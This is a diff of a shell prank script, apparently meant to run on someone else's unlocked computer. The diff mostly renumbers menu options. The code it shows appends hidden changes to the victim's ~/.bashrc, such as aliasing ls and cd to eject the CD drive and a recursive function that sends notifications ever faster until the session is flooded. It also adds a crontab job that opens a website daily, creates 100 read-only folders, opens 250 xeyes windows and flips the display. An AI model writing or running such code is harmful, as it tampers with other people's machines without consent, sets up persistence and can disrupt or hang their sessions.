@@ -55,25 +55,23 @@ do
         5) # Set keyboard layout to colemak
             echo "setxkbmap us colemak" >> ~/.bashrc
             ;;
-        6) # Set keyboard layout to turkish
-            echo "setxkbmap tr" >> ~/.bashrc
-            ;;
-        7) # Set default editor to gedit
+        6) # Set default editor to gedit
             echo "export EDITOR=gedit" >> ~/.bashrc
             ;;
-        8) # Eject CD-drive on certain commands
+        7) # Eject CD-drive on certain commands
             echo "alias ls=\"sh -c 'eject &' && `which ls`\"" >> ~/.bashrc
             echo "alias cd=\"sh -c 'eject &' && `which cd`\"" >> ~/.bashrc
             ;;
-        9) # Open beepdog daily
+        8) # Open beepdog daily
             crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
             ;;
-        10) # Emulate DOS-prompt
+        9) # Emulate DOS-prompt
             echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> ~/.bashrc
             ;;
-        11) # Create ~-folder
+        10) # Create ~-folder
             mkdir -p -m 0400 ~/\~/{1..100}
-        12) # Give user a notification more and more often
+            ;;
+        11) # Give user a notification more and more often
             if [ `command -v notify-send` ] ; then
                 echo ":(){ (sleep \$1 ; notify-send "Ulåst datamat er ulåst" ; : \$((\$1/2))) };: 600 &" >> ~/.bashrc
             fi
@@ -93,30 +91,27 @@ do
         2) # Set keyboard layout to colemak
             setxkbmap us colemak
             ;;
-        3) # Set keyboard layout to turkish
-            setxkbmap tr
-            ;;
-        4) # Open lots of eyes
+        3) # Open lots of eyes
             for i in {1 .. 250}
             do
                 nohup xeyes >> /dev/null &
             done
             ;;
-        5) # Flip display
+        4) # Flip display
             xrandr --output $DEVICE --reflect x
             ;;
-        6) # Flip display
+        5) # Flip display
             xrandr --output $DEVICE --reflect y
             ;;
-        7) # Beepdog!
+        6) # Beepdog!
             nohup www-browser http://beepdog.us >> /dev/null &
             ;;
-        8) # Play the first notes of "Trololo" on the users PC speaker
+        7) # Play the first notes of "Trololo" on the users PC speaker
             beep -f 261.6 -l 30 -D 70 -n -f 329.6 -l 30 -D 70 -n -f 392.0 -l 30 -D 70 -n -f 493.9 -l 30 -D 70 -n -f
 440.0 -l 30 -D 170 -n -f 440.0 -l 30 -D 70 -n -f 349.2 -l 30 -D 70 -n -f 392.0 -l 30 -D 170 -n -f 392.0 -l 30 -D 70 -n
 -f 277.2 -l 30 -D 70 -n -f 329.0 -l 30
             ;;
-        9) # Make Firefox pretty, 0 bugs 2> /dev/null
+        8) # Make Firefox pretty, 0 bugs 2> /dev/null
             OS=`uname -a|awk '{print $1}'`
             case $OS in
                 "Darwin" )
